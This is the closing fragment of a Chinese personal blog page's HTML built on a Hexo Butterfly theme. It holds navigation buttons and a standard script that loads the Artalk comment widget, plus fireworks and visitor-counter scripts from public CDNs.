fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  let artalkItem = null
+  const option = null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+
+  const destroyArtalk = () => {
+    if (artalkItem) {
+      artalkItem.destroy()
+      artalkItem = null
+    }
+  }
+
+  const artalkChangeMode = theme => artalkItem && artalkItem.setDarkMode(theme === 'dark')
+
+  const initArtalk = (el = document, pageKey = location.pathname) => {
+    artalkItem = Artalk.init({
+      el: el.querySelector('#artalk-wrap'),
+      server: 'https://www.yliken.top/',
+      site: 'Yliken 的博客',
+      darkMode: document.documentElement.getAttribute('data-theme') === 'dark',
+      ...option,
+      pageKey: isShuoshuo ? pageKey : (option && option.pageKey) || pageKey
+    })
+
+    if (GLOBAL_CONFIG.lightbox === 'null') return
+    artalkItem.on('list-loaded', () => {
+      artalkItem.ctx.get('list').getCommentNodes().forEach(comment => {
+        const $content = comment.getRender().$content
+        btf.loadLightbox($content.querySelectorAll('img:not([atk-emoticon])'))
+      })
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyArtalk = () => {
+        destroyArtalk()
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    btf.addGlobalFn('pjaxSendOnce', destroyArtalk, 'destroyArtalk')
+    btf.addGlobalFn('themeChange', artalkChangeMode, 'artalk')
+  }
+
+  const loadArtalk = async (el, pageKey) => {
+    if (typeof Artalk === 'object') initArtalk(el, pageKey)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.js')
+      initArtalk(el, pageKey)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Artalk' === 'Artalk'
+      ? window.shuoshuoComment = { loadComment: loadArtalk }
+      : window.loadOtherComment = loadArtalk
+    return
+  }
+
+  if ('Artalk' === 'Artalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('artalk-wrap'), loadArtalk)
+    else setTimeout(loadArtalk, 100)
+  } else {
+    window.loadOtherComment = loadArtalk
+  }
+})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
